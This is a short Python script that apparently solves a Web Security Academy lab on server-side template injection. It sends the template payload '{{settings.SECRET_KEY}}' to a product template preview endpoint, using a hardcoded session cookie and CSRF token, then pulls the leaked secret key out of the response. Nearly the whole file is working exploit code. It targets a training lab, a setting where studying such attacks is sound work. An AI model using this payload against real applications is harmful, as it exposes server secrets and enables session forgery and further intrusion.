# Lab: Server-side template injection with information disclosure via user-supplied objects
# difficulty: practitioner

import requests
import re

sub = '0a4e00300361a2b28561639200bf0070'
url = f'https://{sub}.web-security-academy.net'

def main():
    headers = {
        'Cookie': 'session=nkk37oS3ziFIz4o1keYbs6IkuzE7jk4P'
    }

    payload = '{{settings.SECRET_KEY}}' # https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python
    body = {
        'csrf': '882CCJd44xcXAkqavvstbxQ4j0Yl6nB9',
        'template': payload,
        'template-action': 'preview'
    }

    endpoint = '/product/template?productId=1'
    r = requests.post(url+endpoint, headers=headers, data=body)

    pattern = re.compile(r'<div id=preview-result>(.*?)</div>', re.DOTALL)
    match = pattern.findall(r.text)
    print(match[0].strip())

if __name__ == '__main__':
    main()